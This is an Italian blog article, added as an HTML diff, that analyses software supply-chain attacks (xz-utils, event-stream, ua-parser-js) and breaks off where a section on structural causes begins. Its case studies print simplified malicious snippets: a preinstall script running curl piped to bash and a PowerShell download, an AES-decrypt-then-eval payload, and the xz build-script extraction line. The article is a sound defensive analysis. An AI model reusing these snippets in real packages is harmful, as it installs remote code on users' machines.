@@ -1,0 +1,984 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <script>(function(){var t;if(location.search.indexOf('t=l')>-1)t='light';else if(location.search.indexOf('t=d')>-1)t='dark';if(!t)try{t=localStorage.getItem('theme')}catch(e){}document.documentElement.dataset.theme=t||'dark'})()</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Il Codice Risorge | Signal Pirate</title>
+  <meta name="description" content="Codice eliminato, commentato, rimosso da anni che torna in vita attraverso dipendenze transitive, rollback, supply chain. xz-utils, event-stream, ua-parser-js: anatomia della resurrezione. 5 meccanismi, 3 case study, detection e difesa.">
+  <link rel="icon" type="image/svg+xml" href="../assets/favicon.svg">
+  <link rel="alternate" type="application/rss+xml" title="Signal Pirate" href="../feed.xml">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=JetBrains+Mono:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css">
+
+  <style>
+    .insight-box {
+      background: linear-gradient(135deg, rgba(124,77,255,0.1), rgba(0,255,136,0.05));
+      border-left: 3px solid var(--accent-highlight);
+      border-radius: 0 10px 10px 0;
+      padding: 1.2rem 1.5rem;
+      margin: 1.5rem 0;
+    }
+    .insight-box p { margin: 0; line-height: 1.6; }
+    .warning-box {
+      background: linear-gradient(135deg, rgba(255,107,107,0.1), rgba(255,136,0,0.05));
+      border-left: 3px solid var(--accent-reaction);
+      border-radius: 0 10px 10px 0;
+      padding: 1.2rem 1.5rem;
+      margin: 1.5rem 0;
+    }
+    .warning-box p { margin: 0; line-height: 1.6; }
+    .section-number {
+      display: block;
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      color: var(--text-secondary);
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      margin-bottom: 1rem;
+    }
+    .code-block {
+      background: #0d1117;
+      border: 1px solid rgba(0,255,136,0.12);
+      border-radius: 10px;
+      margin: 1.5rem 0;
+      overflow-x: auto;
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      line-height: 1.7;
+      color: #c8c8d8;
+      position: relative;
+    }
+    .code-block::before {
+      content: attr(data-lang);
+      position: absolute;
+      top: 0.5rem;
+      right: 0.8rem;
+      font-size: 0.65rem;
+      color: var(--text-secondary);
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      opacity: 0.5;
+      z-index: 1;
+    }
+    .code-block table { border-collapse: collapse; width: 100%; }
+    .code-block td { padding: 0; vertical-align: top; border: none; }
+    .code-block td:hover { background: none; }
+    .code-block .ln {
+      width: 3.2em;
+      padding: 0.2em 0.8em 0.2em 0.6em;
+      text-align: right;
+      color: #3a3a5a;
+      user-select: none;
+      border-right: 1px solid #1a1a2e;
+      background: #090d14;
+      font-size: 0.72rem;
+    }
+    .code-block .code { padding: 0.2em 0 0.2em 1em; white-space: pre; }
+    .code-block .code-wrap { padding: 0.8rem 0; }
+    .code-block .cm { color: #6a6a8a; }
+    .code-block .kw { color: #7c4dff; }
+    .code-block .st { color: #00ff88; }
+    .code-block .nb { color: #ff8800; }
+    .code-block .fn { color: #4ecdc4; }
+    .code-block .key { color: #ff6b6b; }
+    .code-block .dc { color: #8b949e; font-style: italic; }
+    .accent { color: var(--accent-attention); }
+    .article-content strong { color: var(--accent-yellow); }
+    code {
+      font-family: var(--font-mono);
+      font-size: 0.85em;
+      background: rgba(0,255,136,0.08);
+      padding: 0.15em 0.4em;
+      border-radius: 4px;
+      color: var(--accent-attention);
+    }
+    .arch-diagram {
+      background: #0d1117;
+      border: 1px solid rgba(0,255,136,0.12);
+      border-radius: 10px;
+      padding: 1.5rem 2rem;
+      margin: 1.5rem 0;
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      line-height: 1.8;
+      color: #c8c8d8;
+      overflow-x: auto;
+      white-space: pre;
+    }
+    .arch-diagram .accent-g { color: #00ff88; }
+    .arch-diagram .accent-p { color: #7c4dff; }
+    .arch-diagram .accent-y { color: #ff8800; }
+    .arch-diagram .accent-r { color: #ff6b6b; }
+    .conclusion-box {
+      background: linear-gradient(135deg, rgba(0,255,136,0.08), rgba(124,77,255,0.08));
+      border: 1px solid rgba(0,255,136,0.2);
+      border-radius: 12px;
+      padding: 2rem;
+      margin: 2rem 0;
+      text-align: center;
+    }
+    .conclusion-box .quote {
+      font-family: var(--font-mono);
+      font-size: 1.2rem;
+      color: var(--accent-attention);
+      line-height: 1.6;
+      margin-bottom: 1rem;
+    }
+    .timeline {
+      position: relative;
+      padding-left: 2rem;
+      margin: 1.5rem 0;
+    }
+    .timeline::before {
+      content: '';
+      position: absolute;
+      left: 0;
+      top: 0;
+      bottom: 0;
+      width: 2px;
+      background: linear-gradient(to bottom, var(--accent-attention), var(--accent-reaction));
+    }
+    .timeline-event {
+      position: relative;
+      margin-bottom: 1.5rem;
+      padding: 1rem 1.2rem;
+      background: rgba(0,255,136,0.03);
+      border-radius: 8px;
+      border: 1px solid rgba(0,255,136,0.08);
+    }
+    .timeline-event::before {
+      content: '';
+      position: absolute;
+      left: -2.35rem;
+      top: 1.2rem;
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: var(--accent-attention);
+      border: 2px solid #0d1117;
+    }
+    .timeline-event.danger::before { background: var(--accent-reaction); }
+    .timeline-date {
+      font-family: var(--font-mono);
+      font-size: 0.72rem;
+      color: var(--text-secondary);
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+    .timeline-text { margin-top: 0.3rem; line-height: 1.6; }
+    .attack-flow {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+      margin: 1.5rem 0;
+      padding: 1.2rem;
+      background: rgba(0,0,0,0.2);
+      border-radius: 10px;
+      border: 1px solid rgba(0,255,136,0.08);
+    }
+    .flow-node {
+      padding: 0.5rem 1rem;
+      border-radius: 6px;
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      font-weight: 600;
+    }
+    .flow-node.tool { background: rgba(0,255,136,0.15); color: #00ff88; border: 1px solid rgba(0,255,136,0.3); }
+    .flow-node.leak { background: rgba(255,107,107,0.15); color: #ff6b6b; border: 1px solid rgba(255,107,107,0.3); }
+    .flow-node.secret { background: rgba(124,77,255,0.15); color: #7c4dff; border: 1px solid rgba(124,77,255,0.3); }
+    .flow-node.ok { background: rgba(78,205,196,0.15); color: #4ecdc4; border: 1px solid rgba(78,205,196,0.3); }
+    .flow-arrow { color: var(--text-secondary); font-size: 1.2rem; }
+    .stats-row {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+      gap: 1rem;
+      margin: 1.5rem 0;
+    }
+    .stat-card {
+      background: rgba(0,255,136,0.04);
+      border: 1px solid rgba(0,255,136,0.1);
+      border-radius: 10px;
+      padding: 1.2rem;
+      text-align: center;
+    }
+    .stat-value {
+      display: block;
+      font-family: var(--font-mono);
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: var(--accent-attention);
+    }
+    .stat-label {
+      display: block;
+      font-size: 0.75rem;
+      color: var(--text-secondary);
+      margin-top: 0.3rem;
+    }
+    .strategy-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 1.5rem 0;
+      font-size: 0.85rem;
+    }
+    .strategy-table th {
+      background: rgba(0,255,136,0.08);
+      padding: 0.8rem 1rem;
+      text-align: left;
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      color: var(--accent-attention);
+      border-bottom: 1px solid rgba(0,255,136,0.15);
+    }
+    .strategy-table td {
+      padding: 0.7rem 1rem;
+      border-bottom: 1px solid rgba(255,255,255,0.05);
+      vertical-align: top;
+    }
+    .strategy-table tr:hover td { background: rgba(0,255,136,0.03); }
+    .terminal-output {
+      background: #0a0a14;
+      border: 1px solid rgba(0,255,136,0.12);
+      border-radius: 10px;
+      padding: 1.2rem 1.5rem;
+      margin: 1.5rem 0;
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      line-height: 1.8;
+      color: #c8c8d8;
+      overflow-x: auto;
+    }
+    .terminal-output .t-prompt { color: #00ff88; }
+    .terminal-output .t-cmd { color: #4ecdc4; }
+    .terminal-output .t-out { color: #8b949e; }
+    .terminal-output .t-err { color: #ff6b6b; }
+    .terminal-output .t-warn { color: #ff8800; }
+  </style>
+</head>
+<body>
+
+<!-- ======================== NAV ======================== -->
+<nav class="nav">
+  <a href="../index.html" class="nav-logo">SIGNAL<span>PIRATE</span></a>
+  <ul class="nav-links">
+    <li><a href="../index.html">Home</a></li>
+    <li><a href="../index.html#articoli">Articoli</a></li>
+    <li><a href="https://github.com/pinperepette" target="_blank" rel="noopener">GitHub</a></li>
+  </ul>
+  <button id="theme-toggle" aria-label="Cambia tema">
+    <svg id="theme-icon-dark" viewBox="0 0 24 24"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+    <svg id="theme-icon-light" viewBox="0 0 24 24"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+  </button>
+</nav>
+
+<!-- ======================== HEADER ======================== -->
+<header class="article-header">
+  <p class="article-meta">2026-04-04 | Pinperepette</p>
+  <h1 class="article-page-title">Il Codice <span class="accent">Risorge</span></h1>
+  <p style="font-family: var(--font-mono); font-size: 1rem; color: var(--text-secondary); margin-top: 1rem;">
+    Codice eliminato, rimosso, sepolto. Che torna in vita attraverso dipendenze transitive, supply chain avvelenate e rollback sbagliati. Anatomia della resurrezione.
+  </p>
+  <div class="article-card-tags" style="justify-content: center; margin-top: 1.5rem;">
+    <span class="tag tag-attention">Supply Chain</span>
+    <span class="tag tag-highlight">Security</span>
+    <span class="tag tag-reaction">Backdoor</span>
+    <span class="tag tag-amplification">Dead Code</span>
+  </div>
+</header>
+
+<!-- ======================== ARTICLE ======================== -->
+<article class="article-content">
+
+
+<!-- ======================================================= -->
+<!-- SEZ. 00 - IL CIMITERO DEI PACCHETTI                     -->
+<!-- ======================================================= -->
+<h2><span class="accent">//</span> Il Cimitero dei Pacchetti</h2>
+<span class="section-number">Sezione 00. Niente resta morto per sempre</span>
+
+<p>
+  Febbraio 2024. Un tizio di Microsoft, Andres Freund, sta facendo benchmark su Postgres e nota che i login SSH ci mettono mezzo secondo in piu'. Mezzo secondo. La maggior parte di noi avrebbe bestemmiato, dato la colpa alla rete e via. Freund no. Freund e' il tipo che profila <code>sshd</code> perche' mezzo secondo lo fa impazzire. E quello che tira fuori da <code>liblzma</code> e' roba che fa venire i brividi: una delle backdoor piu' cattive mai trovate nell'open source.
+</p>
+
+<p>
+  Qualcuno si era fatto due anni di gavetta come maintainer su <code>xz-utils</code>, un progetto di compressione che non guarda nessuno. Due anni di patch buone, bug fix, risposte gentili nelle issue. Il bravo ragazzo. Poi, con i permessi guadagnati, ha infilato codice offuscato dentro i file di test. File binari, roba che nessun reviewer umano aprirebbe mai. Quel codice si svegliava solo durante il build delle distro Linux, modificava la compilazione al volo, e alla fine patchava <code>sshd</code> in memoria per accettare comandi da chi aveva la chiave giusta.
+</p>
+
+<p>
+  Il bello? Il codice malevolo non stava nel sorgente C. Stava in file <code>.xz</code> nella cartella test. Binari opachi che il build system decomprimeva, concatenava con uno script <code>m4</code>, e linkava nel risultato finale. Se leggevi il sorgente era tutto pulito. Il binario compilato no.
+</p>
+
+<div class="warning-box">
+  <p><strong>Il punto non e' la backdoor.</strong> Il punto e' che il vettore d'attacco era codice che non doveva girare. File di test. Roba morta. Eppure e' finita dentro <code>sshd</code> su milioni di macchine. Il codice morto risorge. E quando risorge, ha i permessi di root.</p>
+</div>
+
+
+<!-- ======================================================= -->
+<!-- SEZ. 01 - I 5 MECCANISMI DI RESURREZIONE               -->
+<!-- ======================================================= -->
+<h2><span class="accent">//</span> I Cinque Modi in Cui il Codice Risorge</h2>
+<span class="section-number">Sezione 01. Tassonomia della resurrezione</span>
+
+<p>
+  Ho messo insieme cinque meccanismi con cui codice che dovrebbe essere morto torna a girare. Ogni attacco alla supply chain che ho studiato ne usa almeno uno. Spesso due o tre combinati.
+</p>
+
+<h3>1. Dipendenze transitive</h3>
+
+<p>
+  Il tuo progetto dipende da <code>A</code>. <code>A</code> dipende da <code>B</code>. <code>B</code> dipende da <code>C</code>. Hai mai letto il codice di <code>C</code>? Probabilmente non sai neanche che esiste. Eppure gira nel tuo processo, con i tuoi permessi, con accesso al tuo filesystem.
+</p>
+
+<div class="arch-diagram"><span class="accent-g">il-tuo-progetto</span>
+    ├── <span class="accent-p">express</span> (lo conosci)
+    │   ├── <span class="accent-y">body-parser</span> (forse)
+    │   │   └── <span class="accent-r">raw-body</span> (chi?)
+    │   │       └── <span class="accent-r">unpipe</span> (???)
+    │   ├── <span class="accent-y">cookie</span>
+    │   ├── <span class="accent-y">qs</span>
+    │   │   └── <span class="accent-r">side-channel</span> (???)
+    │   │       └── <span class="accent-r">call-bind</span> (...ok basta)
+    │   └── <span class="accent-y">accepts</span>
+    │       └── <span class="accent-r">negotiator</span>
+    └── <span class="accent-p">jsonwebtoken</span> (lo conosci)
+        └── <span class="accent-y">jws</span>
+            └── <span class="accent-r">jwa</span>
+                └── <span class="accent-r">buffer-equal-constant-time</span> (82 righe, 7M dl/week)</div>
+
+<p>
+  Un progetto Express medio si tira dentro 50, 60 pacchetti. Un progetto React supera i 200. Ogni singolo pacchetto puo' eseguire script arbitrari quando fai <code>npm install</code>, grazie al campo <code>postinstall</code>. Gira tutto nel contesto del tuo utente. La cartella <code>node_modules</code> non e' una cartella. E' un cimitero. E ogni <code>npm install</code> e' una riesumazione.
+</p>
+
+<h3>2. Maintainer takeover</h3>
+
+<p>
+  Il maintainer si stufa. Un progetto che usano in migliaia ma che mantiene una persona sola, gratis, nel weekend. Arriva qualcuno che si offre di dare una mano. Contribuzioni utili per mesi. Poi il maintainer gli sgancia i permessi di publish. E a quel punto il pacchetto e' andato.
+</p>
+
+<p>
+  Esattamente quello che e' successo con <code>event-stream</code> nel 2018. Il maintainer originale, Dominic Tarr, l'ha ammesso nella issue: il tizio nuovo ha aggiunto una dipendenza, <code>flatmap-stream</code>, con dentro codice AES encrypted nel <code>postinstall</code>. Il payload si svegliava solo nell'app Copay di BitPay. Rubava chiavi private di wallet Bitcoin. Targeted come pochi.
+</p>
+
+<div class="attack-flow">
+  <div class="flow-node tool">maintainer burnout</div>
+  <div class="flow-arrow">&rarr;</div>
+  <div class="flow-node secret">social engineering</div>
+  <div class="flow-arrow">&rarr;</div>
+  <div class="flow-node ok">publish rights</div>
+  <div class="flow-arrow">&rarr;</div>
+  <div class="flow-node leak">inject dep</div>
+  <div class="flow-arrow">&rarr;</div>
+  <div class="flow-node leak">encrypted payload</div>
+  <div class="flow-arrow">&rarr;</div>
+  <div class="flow-node leak">steal BTC keys</div>
+</div>
+
+<h3>3. Typosquatting e dependency confusion</h3>
+
+<p>
+  Pubblichi un pacchetto che si chiama <code>crossenv</code> invece di <code>cross-env</code>. Oppure <code>loadash</code> invece di <code>lodash</code>. Prima o poi qualcuno sbaglia a scrivere il nome nel <code>package.json</code>. E il tuo pacchetto entra nella sua build.
+</p>
+
+<p>
+  La dependency confusion e' peggio. Le aziende usano registry npm interni per i pacchetti privati. Se il pacchetto interno si chiama <code>company-utils</code> e tu pubblichi un <code>company-utils</code> sul registry pubblico con un numero di versione piu' alto, npm scarica il tuo. Automaticamente. Alex Birsan l'ha dimostrato nel 2021 contro Apple, Microsoft e PayPal. Ha eseguito codice sui loro build server. Senza exploit, senza 0day. Solo un <code>npm publish</code> con il nome giusto.
+</p>
+
+<h3>4. Build system injection</h3>
+
+<p>
+  Il sorgente e' pulito. Il build system no. xz-utils e' l'esempio perfetto: il codice C non aveva niente di strano. Lo script <code>m4</code> che girava durante il build iniettava le istruzioni nella compilazione. Se fai code review sul sorgente, non trovi nulla. Se fai code review sul <code>Makefile</code> generato da <code>autoconf</code>... vabe', nessuno fa code review sui Makefile generati da autoconf. Sono bestie da 30.000 righe.
+</p>
+
+<div class="code-block" data-lang="M4 / Autoconf">
+  <div class="code-wrap">
+    <table>
+      <tr><td class="ln">1</td><td class="code"><span class="cm"># Da build-to-host.m4 (file legittimo di xz-utils, modificato)</span></td></tr>
+      <tr><td class="ln">2</td><td class="code"><span class="cm"># Questo frammento estrae il payload dai file di test</span></td></tr>
+      <tr><td class="ln">3</td><td class="code"><span class="kw">gl_am_configmake</span>=`<span class="fn">grep</span> -aErls <span class="st">"#{4}[[:alnum:]]{5}#{4}$"</span> $srcdir/tests/*.xz`</td></tr>
+      <tr><td class="ln">4</td><td class="code">...</td></tr>
+      <tr><td class="ln">5</td><td class="code"><span class="cm"># Decomprime, deoffusca, esegue. 4 stage di deobfuscation.</span></td></tr>
+      <tr><td class="ln">6</td><td class="code"><span class="kw">eval</span> $gl_am_configmake | <span class="fn">tr</span> <span class="st">"\t \-_"</span> <span class="st">" \t_\-"</span> | <span class="fn">xz</span> -d 2&gt;/dev/null</td></tr>
+    </table>
+  </div>
+</div>
+
+<p>
+  L'offuscamento era brutale. Il payload passava attraverso quattro livelli di decompressione e sostituzione di caratteri. Uno <code>grep</code> cercava un pattern nei file <code>.xz</code> di test, estraeva byte, li decomprimeva, e il risultato era uno script shell che patchava il linking. Roba da pazzi.
+</p>
+
+<h3>5. Codice dormiente nei binari</h3>
+
+<p>
+  Codice compilato che resta nel binario anche quando il sorgente che lo chiamava e' stato cancellato. Il linker non elimina tutto il dead code, specialmente con il dynamic linking. Funzioni che nessuno chiama restano li' nell'eseguibile. E si possono riattivare con una tecnica vecchia come il mondo: <strong>ROP, Return-Oriented Programming</strong>. Se il gadget e' nel binario, l'attaccante lo usa. Anche se il programmatore pensava di averlo tolto.
+</p>
+
+<div class="insight-box">
+  <p><strong>Il paradosso del dead code:</strong> il compilatore puo' eliminare codice unreachable in compilazione (<code>-fdce</code>, <code>-flto</code>). Ma il dead code eliminato dal compilatore non e' lo stesso dead code che ci preoccupa. Quello pericoloso e' il codice che il build system, le dipendenze, o il linker dinamico portano dentro senza che nessuno lo abbia chiesto.</p>
+</div>
+
+
+<!-- ======================================================= -->
+<!-- SEZ. 02 - CASE STUDY: XZ-UTILS                         -->
+<!-- ======================================================= -->
+<h2><span class="accent">//</span> Anatomia di xz-utils (CVE-2024-3094)</h2>
+<span class="section-number">Sezione 02. Due anni di pazienza</span>
+
+<p>
+  Smontiamo l'attacco pezzo per pezzo. Perche' la roba inquietante di xz-utils non e' il payload, e' la strategia. L'attaccante, che si faceva chiamare "Jia Tan", ha giocato una partita lunghissima.
+</p>
+
+<div class="timeline">
+  <div class="timeline-event">
+    <div class="timeline-date">2021: primo contatto</div>
+    <div class="timeline-text">Jia Tan inizia a inviare patch legittime al progetto. Piccole correzioni, niente di sospetto. Si costruisce una storia di commit pulita.</div>
+  </div>
+  <div class="timeline-event">
+    <div class="timeline-date">2022: pressione sul maintainer</div>
+    <div class="timeline-text">Account multipli (quasi sicuramente sockpuppet) iniziano a lamentarsi nelle issue che il maintainer originale, Lasse Collin, e' troppo lento. Pressione psicologica deliberata, coordinata.</div>
+  </div>
+  <div class="timeline-event">
+    <div class="timeline-date">2023: co-maintainer</div>
+    <div class="timeline-text">Collin, sotto pressione e con problemi personali, concede a Jia Tan i permessi di commit e release. Da quel momento Jia Tan fa le release ufficiali.</div>
+  </div>
+  <div class="timeline-event danger">
+    <div class="timeline-date">Febbraio 2024: il payload</div>
+    <div class="timeline-text">Jia Tan committa file di test binari (<code>bad-3-corrupt_lzma2.xz</code>, <code>good-large_compressed.lzma</code>) che contengono il payload offuscato. Modifica <code>build-to-host.m4</code> per estrarlo in fase di build. Rilascia le versioni 5.6.0 e 5.6.1.</div>
+  </div>
+  <div class="timeline-event danger">
+    <div class="timeline-date">Marzo 2024: distribuzione</div>
+    <div class="timeline-text">Fedora 41, openSUSE Tumbleweed e Debian sid/testing integrano le versioni compromesse. La backdoor e' in produzione.</div>
+  </div>
+  <div class="timeline-event">
+    <div class="timeline-date">29 Marzo 2024: scoperta</div>
+    <div class="timeline-text">Andres Freund nota il rallentamento, profila, trova la backdoor. Pubblica sulla mailing list oss-security. Il mondo si ferma.</div>
+  </div>
+</div>
+
+<p>
+  L'architettura del payload merita un discorso a parte. Il codice attraversava cinque stadi prima di diventare eseguibile:
+</p>
+
+<div class="attack-flow">
+  <div class="flow-node tool">test/*.xz</div>
+  <div class="flow-arrow">&rarr;</div>
+  <div class="flow-node secret">grep pattern</div>
+  <div class="flow-arrow">&rarr;</div>
+  <div class="flow-node secret">tr + xz -d</div>
+  <div class="flow-arrow">&rarr;</div>
+  <div class="flow-node secret">shell script</div>
+  <div class="flow-arrow">&rarr;</div>
+  <div class="flow-node leak">patch linker</div>
+  <div class="flow-arrow">&rarr;</div>
+  <div class="flow-node leak">hook sshd</div>
+</div>
+
+<p>
+  Il payload finale intercettava <code>RSA_public_decrypt</code> in <code>sshd</code> attraverso il meccanismo <code>IFUNC</code> (Indirect Function) della glibc. Quando un client SSH mandava una chiave pubblica con un payload firmato con la chiave dell'attaccante, il codice non faceva il login: eseguiva un comando arbitrario come root. Una backdoor chirurgica. Invisibile al monitoring, invisibile ai log, attivabile solo da chi ha la chiave. Roba da servizi segreti.
+</p>
+
+<div class="stats-row">
+  <div class="stat-card">
+    <span class="stat-value">~750</span>
+    <span class="stat-label">commit di Jia Tan</span>
+  </div>
+  <div class="stat-card">
+    <span class="stat-value">2 anni</span>
+    <span class="stat-label">di preparazione</span>
+  </div>
+  <div class="stat-card">
+    <span class="stat-value">5 stadi</span>
+    <span class="stat-label">di deobfuscation</span>
+  </div>
+  <div class="stat-card">
+    <span class="stat-value">0</span>
+    <span class="stat-label">linee sospette nel sorgente C</span>
+  </div>
+</div>
+
+
+<!-- ======================================================= -->
+<!-- SEZ. 03 - CASE STUDY: EVENT-STREAM                     -->
+<!-- ======================================================= -->
+<h2><span class="accent">//</span> event-stream: Il Pacchetto Fantasma</h2>
+<span class="section-number">Sezione 03. 1.5 milioni di download a settimana, zero maintainer</span>
+
+<p>
+  Novembre 2018. Uno apre una issue su <code>event-stream</code>, pacchetto npm con 1.5 milioni di download a settimana. Titolo: "I don't know what to say." Ha trovato codice offuscato in una sotto-dipendenza chiamata <code>flatmap-stream</code>. La risposta di Dominic Tarr, il maintainer originale, va letta tutta. Ha praticamente detto: non me ne occupavo piu', ho dato le chiavi a uno che si e' offerto, non l'ho controllato. Fine.
+</p>
+
+<p>
+  Il payload era elegante, in un modo bastardo. <code>flatmap-stream</code> conteneva codice minificato che faceva una cosa sola: al primo avvio controllava se il pacchetto <code>copay-dash</code> era nel progetto. Se si', decrittava un secondo payload con AES-256-CBC (chiave derivata dal nome del pacchetto stesso) e lo iniettava nel processo. Il payload intercettava le chiavi private dei wallet Bitcoin degli utenti Copay.
+</p>
+
+<div class="code-block" data-lang="JavaScript">
+  <div class="code-wrap">
+    <table>
+      <tr><td class="ln">1</td><td class="code"><span class="cm">// Payload deobfuscato di flatmap-stream (semplificato)</span></td></tr>
+      <tr><td class="ln">2</td><td class="code"><span class="kw">var</span> dep = <span class="fn">require</span>(<span class="st">'crypto'</span>);</td></tr>
+      <tr><td class="ln">3</td><td class="code"><span class="kw">try</span> {</td></tr>
+      <tr><td class="ln">4</td><td class="code">    <span class="kw">var</span> mod = <span class="fn">require</span>(<span class="st">'copay-dash'</span>);</td></tr>
+      <tr><td class="ln">5</td><td class="code">    <span class="cm">// Se copay-dash esiste, siamo dentro l'app BitPay</span></td></tr>
+      <tr><td class="ln">6</td><td class="code">    <span class="kw">var</span> key = dep.<span class="fn">createDecipher</span>(<span class="st">'aes256'</span>, <span class="fn">getKey</span>());</td></tr>
+      <tr><td class="ln">7</td><td class="code">    <span class="kw">var</span> decrypted = key.<span class="fn">update</span>(payload, <span class="st">'hex'</span>, <span class="st">'utf8'</span>);</td></tr>
+      <tr><td class="ln">8</td><td class="code">    <span class="cm">// Il payload decrittato ruba le chiavi del wallet</span></td></tr>
+      <tr><td class="ln">9</td><td class="code">    <span class="fn">eval</span>(decrypted);</td></tr>
+      <tr><td class="ln">10</td><td class="code">} <span class="kw">catch</span>(e) {</td></tr>
+      <tr><td class="ln">11</td><td class="code">    <span class="cm">// Se copay-dash non c'e', zitto. Dormiente. Invisibile.</span></td></tr>
+      <tr><td class="ln">12</td><td class="code">}</td></tr>
+    </table>
+  </div>
+</div>
+
+<p>
+  Furbo. Se il payload si attiva ovunque lo beccano subito. Se si attiva solo in un ambiente specifico, in questo caso il build di una app precisa, puo' restare dormiente per settimane nei <code>node_modules</code> di milioni di progetti senza che nessuno lo noti. L'attaccante aveva capito questa cosa fondamentale e l'ha sfruttata perfettamente.
+</p>
+
+<div class="insight-box">
+  <p><strong>Il pattern:</strong> il codice malevolo stava in una dipendenza di una dipendenza. <code>tuo-progetto</code> &rarr; <code>event-stream</code> &rarr; <code>flatmap-stream</code>. Se guardi il tuo <code>package.json</code>, <code>flatmap-stream</code> non c'e'. Sta nel <code>node_modules</code>, tre cartelle sotto. E ha accesso a tutto: filesystem, rete, variabili d'ambiente, token API, chiavi SSH. Tutto.</p>
+</div>
+
+
+<!-- ======================================================= -->
+<!-- SEZ. 04 - CASE STUDY: UA-PARSER-JS                     -->
+<!-- ======================================================= -->
+<h2><span class="accent">//</span> ua-parser-js: Account Hijacking su npm</h2>
+<span class="section-number">Sezione 04. Quando il cimitero ha una porta sul retro</span>
+
+<p>
+  Ottobre 2021. <code>ua-parser-js</code>, pacchetto npm con 8 milioni di download a settimana. Lo usano Facebook, Amazon, Microsoft, Slack, IBM. Qualcuno buca l'account npm del maintainer e pubblica tre versioni con un cryptominer e un password stealer. Le versioni restano online quattro ore.
+</p>
+
+<p>
+  Quattro ore. Con 8 milioni di download a settimana sono circa 190.000 download all'ora. Il payload installava un cryptominer (XMRig, Monero) su Linux e un trojan che rubava password da Chrome e Firefox su Windows. Lo script <code>preinstall</code> nel <code>package.json</code> scaricava il binario e lo eseguiva. Tre righe di codice, devastazione totale.
+</p>
+
+<div class="code-block" data-lang="JSON">
+  <div class="code-wrap">
+    <table>
+      <tr><td class="ln">1</td><td class="code"><span class="cm">// package.json della versione compromessa</span></td></tr>
+      <tr><td class="ln">2</td><td class="code">{</td></tr>
+      <tr><td class="ln">3</td><td class="code">  <span class="key">"name"</span>: <span class="st">"ua-parser-js"</span>,</td></tr>
+      <tr><td class="ln">4</td><td class="code">  <span class="key">"version"</span>: <span class="st">"0.7.29"</span>,</td></tr>
+      <tr><td class="ln">5</td><td class="code">  <span class="key">"scripts"</span>: {</td></tr>
+      <tr><td class="ln">6</td><td class="code">    <span class="key">"preinstall"</span>: <span class="st">"node preinstall.js"</span></td></tr>
+      <tr><td class="ln">7</td><td class="code">  }</td></tr>
+      <tr><td class="ln">8</td><td class="code">}</td></tr>
+    </table>
+  </div>
+</div>
+
+<div class="code-block" data-lang="JavaScript">
+  <div class="code-wrap">
+    <table>
+      <tr><td class="ln">1</td><td class="code"><span class="cm">// preinstall.js (semplificato)</span></td></tr>
+      <tr><td class="ln">2</td><td class="code"><span class="kw">const</span> { <span class="fn">exec</span> } = <span class="fn">require</span>(<span class="st">'child_process'</span>);</td></tr>
+      <tr><td class="ln">3</td><td class="code"><span class="kw">const</span> os = <span class="fn">require</span>(<span class="st">'os'</span>);</td></tr>
+      <tr><td class="ln">4</td><td class="code"></td></tr>
+      <tr><td class="ln">5</td><td class="code"><span class="kw">if</span> (os.<span class="fn">type</span>() === <span class="st">'Linux'</span>) {</td></tr>
+      <tr><td class="ln">6</td><td class="code">    <span class="fn">exec</span>(<span class="st">'curl -s http://[redacted]/l.sh | bash'</span>);</td></tr>
+      <tr><td class="ln">7</td><td class="code">} <span class="kw">else</span> {</td></tr>
+      <tr><td class="ln">8</td><td class="code">    <span class="fn">exec</span>(<span class="st">'powershell -c "Invoke-WebRequest http://[redacted]/w.exe"'</span>);</td></tr>
+      <tr><td class="ln">9</td><td class="code">}</td></tr>
+    </table>
+  </div>
+</div>
+
+<p>
+  Qui il meccanismo di resurrezione e' diverso. Nessuno ha scritto dead code che poi e' tornato in vita. Hanno bucato l'account del maintainer e hanno sostituito il codice vivo con roba malevola. Ma il risultato e' lo stesso: codice che non hai scritto, che non hai letto, che non hai autorizzato, gira sulla tua macchina perche' un giorno hai fatto <code>npm install</code>.
+</p>
+
+<div class="stats-row">
+  <div class="stat-card">
+    <span class="stat-value">8M</span>
+    <span class="stat-label">download/settimana</span>
+  </div>
+  <div class="stat-card">
+    <span class="stat-value">4 ore</span>
+    <span class="stat-label">di esposizione</span>
+  </div>
+  <div class="stat-card">
+    <span class="stat-value">3</span>
+    <span class="stat-label">versioni compromesse</span>
+  </div>
+  <div class="stat-card">
+    <span class="stat-value">~760K</span>
+    <span class="stat-label">download stimati</span>
+  </div>
+</div>
+
+
+<!-- ======================================================= -->
+<!-- SEZ. 05 - IL PROBLEMA STRUTTURALE                      -->
+<!-- ======================================================= -->
+<h2><span class="accent">//</span> Il Problema Strutturale</h2>
+<span class="section-number">Sezione 05. Perche' continuera' a succedere</span>
+
+<p>
+  Il problema e' nell'architettura di come distribuiamo software nel 2026. Guardate i numeri.
+</p>
